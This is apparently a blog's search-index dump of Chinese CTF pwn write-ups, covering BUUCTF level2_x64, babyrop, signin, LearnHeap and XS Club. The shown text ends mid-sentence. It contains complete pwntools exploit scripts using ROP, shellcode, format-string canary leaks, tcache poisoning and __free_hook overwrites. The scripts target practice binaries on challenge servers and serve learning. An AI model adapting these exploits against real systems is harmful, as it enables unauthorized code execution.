arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:\u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;}) ret = 0x4004a1 pop_rdi_ret = 0x4006b3 bin_sh = 0x600a90 system_addr = 0x4004c0 p.recvuntil(b\u0026#34;Input:\\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(ret) + pg(pop_rdi_ret) + pg(bin_sh) + pg(system_addr) p.sendline(payload) p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/jarvisoj_level2_x64/","section":"writeup","summary":"I believe that we are fundamentally the same and have the same basic potential. — Dalai Lama 原题链接 【Write-up】BUUCTF Jarvisoj_level2_x64 checksec 查看架构 ida 查看伪代码 构建 exp 完整 exp checksec 查看架构 $ checksec --file level2_x64 [*] \u0026#39;/home/peterl/security/workspace/level2_x64/level2_x64\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found","tags":["pwn"],"title":"BUUCTF Jarvisoj_level2_x64"},{"categories":null,"contents":"","date":"2022年12月29日","permalink":"https://peterliuzhi.top/archive/archive/","section":"archive","summary":"","tags":null,"title":"归档"},{"categories":["writeup"],"contents":" It is not so much our friends\u0026rsquo; help that helps us, as the confidence of their help. — Epicurus\n原题链接\nEasyEasyEasy 因为读入的是一个有符号数，所以当输入-1 的时候也是合法的\n而我们知道，-1%256 也是-1，而v5[-1]意为*(v5-1)，指向 v5 前面一个数，而该程序只将 v5 后面的 0x100 个数置零，所以前一个数仍可能为非零。\n事实证明确实如此，直接 nc 进去输入-1 即可\n简单的栈溢出 检查程序架构 查看 ida 反编译代码 限制一次输入得到 shell 权限\n思路一：爆破栈地址后四位 先写入 shellcode，然后要把 ret 值覆盖为 shellcode 地址即栈地址，但是限制一次输入，而且没有输出函数，无法泄露栈地址。 这时候在 ret 值的下面四项的位置保存了一个栈地址：\n但是这个值的倒数第三位和 shellocde 地址一定是不同的 所以我们尝试爆破栈地址末四位\n因为栈地址的最后一位是不变的，所以准确来说只用爆破三位 gets 会将输入的\\n 改为\\x00，所以 payload 只能覆盖到末二位，倒数三四位只能覆盖为\\x00\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) pop_rdi_ret = 0x00000000004005e3 ret = 0x000000000040028d shellcode = asm(shellcraft.sh()) print(hex(len(shellcode))) payload = shellcode + b\u0026#34;\\x00\u0026#34;*(0x8) + pg(ret)*4 + p8(0x00) p.clean() p.sendline(payload) p.clean() p.sendline() try: p.recv(timeout=0.25) p.interactive() except: p.close() 思路二：利用jmp rax或call rax 我们把断点设在leave;ret上，gdb 过去会发现 rax 的值刚好是我们输入的字符串的地址\n那么我们就可以利用jmp rax或call rax跳转到 shellcode\n值得注意的是，这里如果使用 pwntools 生成的 shellcode，因为有七个 push，所以 rsp 会上移，而 shellcode 也是存在栈上的，这时就会覆盖一部分 shellcode\n解决办法有两个：\n使用更短的 shellcode shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; 在跳转到 shellcode 前使 rsp 下移 payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) 完整 exp：\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40054F c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) ret = 0x000000000040028d jmp_rax = 0x0000000000400485 call_rax = 0x000000000040051e shellcode = b\u0026#39;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#39; shellcode = asm(shellcraft.amd64.linux.sh()) print(disasm(shellcode)) print(hex(len(shellcode))) payload = shellcode.ljust(0x38, b\u0026#34;a\u0026#34;) + pg(ret)*0x5 + pg(call_rax) p.clean() p.sendline(payload) p.clean() p.interactive() babyrop 此题需要的 libc 版本只能用 ubuntu22 查看程序架构：\n查看 ida 反编译代码：\n有沙箱把 execve 的系统调用给禁了（：谢谢你\n基本思路就是在栈上保存\u0026quot;./flag\\x00\\x00\u0026quot;字符串，然后通过 open、read、write 的系统调用读到 flag\n主要难点是获得./flag 字符串的栈地址（本题 bss 段长度不够，存不了 flag 字符串）\n要点是用mov rdi, rsp; add rdi, 0x40指向 payload 末尾，在末尾保存 flag 字符串\n然后调用依次调用 0x2、0x0、0x1 号系统调用（open、read、write）\n所有的系统调用编号在此\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./baby_rop\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libseccomp.so.2\u0026#34; port: str = \u0026#34;10076\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) # while True: if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40131C c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) pop_rdi_ret = 0x0000000000401207 pop_rdx_ret = 0x000000000040120d mov_rsi_rdi_ret = 0x000000000040120f pop_rax_syscall_ret = 0x0000000000401213 ret = 0x000000000040101a read_addr = 0x4012CF gift = 0x00000000004011fb leave_ret = 0x000000000040131c add_rdi_40_ret = 0x00000000004011fe mov_rdi_rsp_ret = 0x0000000000401203 p.clean() payload = \\ b\u0026#34;./flag\\x00\\x00\u0026#34;*0x7 + \\ pg(pop_rdi_ret) + pg(0) + pg(mov_rsi_rdi_ret) +\\ pg(mov_rdi_rsp_ret) + pg(add_rdi_40_ret)*2 +\\ pg(pop_rax_syscall_ret) + pg(0x2) +\\ pg(mov_rsi_rdi_ret) +\\ pg(pop_rdi_ret) + pg(3) +\\ pg(pop_rdx_ret) + pg(0xff)+\\ pg(pop_rax_syscall_ret) + pg(0x0) +\\ pg(pop_rdi_ret) + pg(1) +\\ pg(pop_rax_syscall_ret) + pg(0x1) + pg(0) + b\u0026#34;./flag\\x00\\x00\u0026#34; p.sendline(payload) try: p.interactive() except: p.close() FLAG：flag{6fU9jIyTmarX2EMwJHvQY7SpLuqVbzAN}\nCTF 查看架构：\n有 canary 查看 ida 反编译代码：\n这题有点寄的是没有 main 函数，只有一个 label1 作为程序入口，所以只能看汇编代码，好在不是很复杂：\n大致的逻辑是要经过两个挑战：\n第一个挑战是经典的速算挑战，用 python 的 eval 函数解析读入的计算式就可以了\n第二个挑战是要利用符号位漏洞，我们输入 0x800000000000000c 即可\n这里要注意的是，我们不能直接用 python 输出这个数，因为 python 会自动解析为很大的无符号数。比较简单的方法是使用 Windows 自带的计算器：\n还有另外一种方法是调用ctypes库，创建long long int类型的变量：\noverflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) 通过第二个挑战后我们就可以开始第三个挑战。第三个挑战是格式化字符串漏洞用于泄露 canary，然后就是一个栈溢出。\n需要注意的是，64 位系统中的格式化字符串的前五个参数分别存在寄存器 RSI/RDX/RCX/R8/R9 中\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher from ctypes import c_longlong as longlong pss: bool = True fn: str = \u0026#34;./CTF\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10074\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x173B) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) p.recvuntil(b\u0026#34;and tell you a secret \u0026#34;) getshell = int(p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1], 16) codebase = getshell - m_elf.sym[\u0026#39;getshell\u0026#39;] for i in range(50): p.recvuntil(b\u0026#34;num1:\u0026#34;) num1 = p.recvuntil(b\u0026#34;,num2:\u0026#34;)[:-6] num2 = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] p.recvuntil(b\u0026#34;operator:\u0026#34;) oper = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] if b\u0026#34;/\u0026#34; in oper: oper = b\u0026#34;//\u0026#34; answer = eval(num1 + oper + num2) p.clean() p.sendline(str(answer)) p.recvuntil(b\u0026#34;Great Job!\\n\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) overflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(str(1)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(b\u0026#34;%25$p.\u0026#34;) p.recvuntil(b\u0026#34;0x\u0026#34;) canary = int(p.recvuntil(b\u0026#34;.\u0026#34;)[:-1], 16) for i in range(2): p.recvuntil(b\u0026#34;...\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(canary) + pg(0) + pg(getshell) p.sendline(payload) p.recvuntil(\u0026#34;Quickly, you are surrounded.\\n\\n\u0026#34;) p.clean() p.interactive() FLAG：flag{114514_V_me_F1fty}\nsignin 法一：free 大 chunk 绕过 tcache bin，然后 tcache poison 检查架构：\n查看 ida 伪代码：\n认真分析一下就会发现还是经典的堆菜单题\n先 free 掉一个很大的 chunk，这样这个 chunk 就会直接进入 unsorted bin（这个临界值我在自己的 64 位机器上测试，大概是 0x409），然后减去 main_arena+96，就可以得到 libc 的基址\n关于这个 main_arena+96 哪里来的，首先将 libc 拖入 ida，搜索 malloc_trim：\nmain_arena 的偏移就是 0x3ebc40\n然后我们使用 gdb 手动 free 一个大 chunk，查看内存\n这里 pwndbg 可以用 bins 命令，但我的 bins 和 heap 出现问题寄了，这里演示一下手动计算 unsorted bin 中只有一个 chunk 时存储的值和 main_arena 的偏移为何为 96\n0x00007ffff7dcdca0-0x7ffff79e2000-0x3ebc40=96\n使用计算器会快很多\n然后我们 free 掉一个小 chunk，让他进入 tcache bin，我们就能更改它的 next 位，从而可以实现任意地址写\n这样我们就可以更改__malloc_hook 的值为 one_gadget 了\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./signin\u0026#34; libc_name:str = \u0026#34;./libc-2.27.so\u0026#34; port: str = \u0026#34;10071\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ENV = {\u0026#34;LD_PRELOAD\u0026#34;:libc_name} context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400904 \u0026#34;\u0026#34;\u0026#34;, env=ENV) else: p = process(fn, env=ENV) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) main_arena = 0x3EBC40 main_off = 96 chunks = 0x6020f0 # malloc的index不能直接控制 def allocate(size: int): p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(size)) # free的标签小于七 # 一共只能free两次 def free(index: int): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(index)) def change(index: int, data: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(data) def show(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) p.recvuntil(b\u0026#34;content: \u0026#34;) return p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] allocate(0x1000) # 1 allocate(0x80) allocate(0x80) free(0) libcbase = u64(show(0)[:9].ljust(0x8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + main_off) success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] malloc_hook_addr = libcbase + libc.sym[\u0026#39;__malloc_hook\u0026#39;] one_gadget = libcbase + 0x10a2fc next_chunk = 0x23 free(1) payload = pg(malloc_hook_addr - next_chunk) change(1, payload) allocate(0x80) allocate(0x7f) # gdb.attach(p) payload = b\u0026#34;0\u0026#34;*0x23 + pg(one_gadget) change(4, payload) allocate(0x10) p.clean() p.interactive() FLAG：flag{cd02sdyy9hfggsyo1wecd8ad2elttilnaj22}\n法二：通过stderr泄露libc，然后更改chunks指针 这个方法的要点在于，因为使用了setbuf函数，所以stdin、stdout、stderr会以全局变量的形式存在程序中。 我们可以通过tcache poisoning来将这个chunk分配到这个地方，然后因为程序中保存所有分配空间的指针chunks也是全局变量，所以这个chunk也可以更改chunks的值，这样子就可以将其指向__malloc_hook，这样子就能够将它的值改为one_gadget了\n这个方法有一个问题，就是分配在stderr处的chunk会将count置零，这是因为分配的位置刚好让count在它的bk位，而malloc会将bk置零： ^962996\n且看下面这个程序：\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(void){ int *a = (int *)malloc(0x80); int *b = (int *)malloc(0x80); free(a); a[2] = 1; a = (int *)malloc(0x80); printf(\u0026#34;%d\\n\u0026#34;, a[2]); } 结果是0：\n若将a[2]改为a[1]，则结果为1：\n说明至少对tcache bin中的chunk来说，bk会被置零而fd不会\n虽然这可能会随着libc版本的改变而改变，但是如果我们做题的时候发现bk被置零了，至少我们多了一种可考虑的可能\nfrom pwn import * path = \u0026#34;/home/linux/0/pwn/signin\u0026#34; stderr = 0x6020A0 context(log_level = \u0026#34;debug\u0026#34;, arch = \u0026#34;amd64\u0026#34;, os = \u0026#34;linux\u0026#34;) #p = process(path) #p = gdb.debug(path, \u0026#34;b *(main+0xC1)\u0026#34;) p = remote(\u0026#34;43.248.98.206\u0026#34;, \u0026#34;10071\u0026#34;) def add(size): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;1\u0026#34;)\tp.sendlineafter(\u0026#34;size: \u0026#34;, str(size)) def edit(index, content): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) p.sendlineafter(\u0026#34;data: \u0026#34;, content) def display(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) def free(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) add(0x80) #0 add(0x80) #1 free(0) free(1) edit(1, p64(stderr)) #tcache poisoning add(0x80) #2 add(0x80) #0 0x6020A0 When mallocing chunk on 0x6020A0, the \u0026#34;idx\u0026#34; on .bss will change into 0. Actually I don\u0026#39;t know why. But the index of this chunk is 0. display(0) #leak libc p.recvuntil(\u0026#34;content: \u0026#34;) libc = int.from_bytes(p.recv(6), \u0026#34;little\u0026#34;) - 0x3EC680 print(\u0026#34;libc =\u0026#34;, hex(libc)) malloc_hook = libc + 0x3EBC30 print(\u0026#34;malloc_hook =\u0026#34;, hex(malloc_hook)) one_gadget = [libc + 0x4f302, libc + 0x10a2fc] edit(0, flat(0, 0, 0, 0, malloc_hook, 0x80)) #change the pointer save in chunks[0] into malloc_hook edit(0, flat(one_gadget[1])) #write one gadget add(0xA0) #trigger malloc_hook p.interactive() 法三：更改chance后将__free_hook改为system地址，在chunk内填入/bin/sh后free掉 libc-2.27.so释放符合大小的堆块会进入tcachebin中\n但是因为chance的限制，程序规定只能释放两次堆块，但利用tcachebin的特性可以改变释放次数\n改变后可以通过先释放大堆块进入unsortedbin，利用它的特性和UAF带出main_arena，然后通过固定偏移可以算出libc基地址\n再释放两次堆块进入tcache bin，改变链首部的堆块的fd指向__free_hook，再申请两个同样大小的堆块，再将__free_hook里的值改为system的，最后通过释放\u0026quot;/bin/sh\u0026quot;的堆块即可实现system('/bin/sh')，还有个地方得注意，只能打印8个堆块的内容，所以申请堆块的数量要把控好\nfrom pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) #p=process(\u0026#39;signin\u0026#39;) libc=ELF(\u0026#39;libc-2.27.so\u0026#39;) p=remote(\u0026#39;43.248.98.206\u0026#39;,10071) elf=ELF(\u0026#39;signin\u0026#39;) def add(size): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;size: \u0026#39;,str(size)) def free(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) def xiugai(index,data): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) p.sendafter(\u0026#39;data: \u0026#39;,data) def pri(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) add(16) add(16) free(0) free(1) payload=p64(0x602070) xiugai(1,payload) add(16) add(16) xiugai(3,b\u0026#39;100\u0026#39;) # 增加chance次数 add(0x500) # 进入unsortedbin add(16) # 防止与top_chunk相连 free(4) pri(4) # 带出main_arena地址 p.recvuntil(\u0026#39;content: \u0026#39;) libc_addr=u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;))-0x3ebca0 success(\u0026#39;libc:\u0026#39;+hex(libc_addr)) #gdb.attach(p) free(0) free(2) xiugai(2,p64(libc.symbols[\u0026#39;__free_hook\u0026#39;]+libc_addr)) add(16) add(16) xiugai(7,p64(libc.symbols[\u0026#39;system\u0026#39;]+libc_addr)) xiugai(6,b\u0026#39;/bin/sh\\x00\u0026#39;) free(6) #gdb.attach(p) p.interactive() LearnHeap 查看程序架构 查看ida反编译代码 int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int ch_0; // [rsp+8h] [rbp-18h] BYREF int i; // [rsp+Ch] [rbp-14h] char *p; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); init(); p = (char *)malloc(0x20uLL); puts(\u0026#34;Welcome to LearnHeap!\u0026#34;); puts(\u0026#34;This is a guided learning test.\u0026#34;); puts(\u0026#34;In this test, gdb and pwndbg may help you.\u0026#34;); puts(byte_176B); puts(\u0026#34;Now you will see a very regular heap question. add() show() delete()\u0026#34;); puts(\u0026#34;Step 1. Leak Libc address.\\nStep 2. double free.\\nStep 3. hijacking __free_hook\\nStep 4. get shell!\u0026#34;); puts(\u0026#34;Now, let\u0026#39;s start!\u0026#34;); Step1(); Step2(); Step3(); Step4(); *free_hook = 0LL; memset(p - 592, 0, 0x240uLL); for ( i = 67; i; --i ) malloc(0x10uLL); memset(book, 0, sizeof(book)); puts(\u0026#34;Now Let\u0026#39;s attack.\u0026#34;); while ( 1 ) { puts(\u0026#34;Welcome~!\\n1.add\\n2.show\\n3.delete\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;ch_0); switch ( ch_0 ) { case 2: show(); break; case 3: delete(); break; case 1: add(); break; default: puts(\u0026#34;error.\u0026#34;); break; } } } step1 泄露libc基址 这里调用了add和delete函数： 因此我们编写的add和delete函数:\ndef add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) 然后我们分配一个大chunk进入unsorted bin，这样它的fd指针会被设为main_arena+96，从而我们可以获得libc基址\n需要注意的是，虽然没有show函数，但是在add函数的最后会将输入的内容puts出来\n又因为malloc会首先从各个bin中寻找合适的chunk，所以我们第三次add的时候会分配到进入unsorted bin中的那个大chunk（或它的一部分），而malloc不会将内容清零（至少fd指针不清零，详情见此）\n所以，最后我们puts出来的，就是main_arena+96的指针\n注意，libc2.26没有tcache bin，所以注意想要进入fastbin的chunk大小（默认最大大小为(64 * SIZE_SZ / 4)，32 位为 64=0x40 字节，64 位为 128=0x80 字节）\nadd(0, 1071, b\u0026#34;\u0026#34;) # 大于1072会退出，但是1033就可以进入unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) step2 double free 构建循环malloc链 因为fastbin在libc2.26中对double free的检查只是单纯地检查表头的chunk是否和正在free的chunk一样，所以只要我们在double free中间随便free一个别的chunk，它就检查不到了（新版本不行）\n如果是2.27~2.28中的tcache bin就更好办了，因为其根本没有任何检查，直接free两次即可 而如果是2.29~2.31，tcache_entry增加了一个attribute，key字段，要么更改key字段然后double free，要么使用fastbin double free，详情见此文章\n大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。 因此，ptmalloc 中专门设计了 fast bin，对应的变量就是 malloc state 中的 fastbinsY\n需要注意的是，能进入fastbin中的chunk会直接进入fastbin，尽管它和top chunk相邻也不会合并，见ctfwiki\ndelete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) step3 更改fd指针指向free_hook，填入危险函数地址 这时我们因为获得了一个循环的malloc链，可以无限地malloc，所以我们可以在第一次add时更改fd指针，指向free_hook，然后将其改为system的地址\n我们将\u0026quot;/bin/sh\u0026quot;存在一个chunk中，若__free_hook的值改为了system，则原本的free(\u0026quot;/bin/sh\u0026quot;)就会产生system(\u0026quot;/bin/sh\u0026quot;)的效果\nadd(3, 0x10, p64(m_elf.sym[\u0026#39;free_hook\u0026#39;])) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) step4 getshell (fake) 这时候我们delete(4)就可以了\ndelete(4) 真实场景getshell！ 就是把上面的思路复现一遍\n不过不同的是我们不用leak libc了，因为上面我们已经获得了libc基址\n直接构建malloc链然后fastbin attack即可\n# flag设为True add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() 完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./learnheap\u0026#34; libc_name:str = \u0026#34;./libc-2.26.so\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) def add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) add(0, 1071, b\u0026#34;\u0026#34;) # 大于1072会退出，但是1033就可以进入unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) delete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) add(3, 0x10, p64(system_addr + 0x394AE8)) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) delete(4) add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() XS Club 检查程序架构 查看ida反编译代码 主要函数： 读取字符串并在末尾置零 一个加密函数，从最后的结果（\u0026quot;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026quot;）来看像是base64编码 base64解码 key = base64.b64decode(\u0026#34;ZjFhZ3tYU0NURi0yMDIyLWdvLWdvLWdvfQ==\u0026#34;) 大致思路 程序用沙箱屏蔽了execve的syscall，那么大致思路就是利用open、read的syscall读入flag\n而程序又把标准输入流和标准输出流关闭了，说明一次运行只能输入一次，而且不会有回显\n但是程序又有一个strcmp，这说明我们可以利用测信道的思路来解题\n在我们调用完strcmp后跳转到这里，如果和flag相符就ret到pause，否则就会jmp rax从而报错退出\n构建ROP chain 我们先用ropper看一下程序的gadget：\n发现并没有我们想要的可以改变rax和rdx的gadget\n如果想要改变rax，我们可以利用函数的返回值保存在rax这个特性：\nset_rax_2 = flat([ # open pop_rdi, pie_base + 0x00000000000011E7, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) set_rax_0x22 = flat([ # pause pop_rdi, pie_base + 0x00000000000011EF, pop_rsi_r15, pie_base + 0x00000000000015A0, 0, strcmp_plt ]) 但是像read这样的函数，往往是必须设置rdx的，所以我们还需要一个改变rdx的gadget\n经过观察，我们可以利用csu中的gadget：\n我们可以先用csu1中的gadget设置寄存器，然后再跳到csu2设置rdx，然后因为csu2中有一个call qword ptr 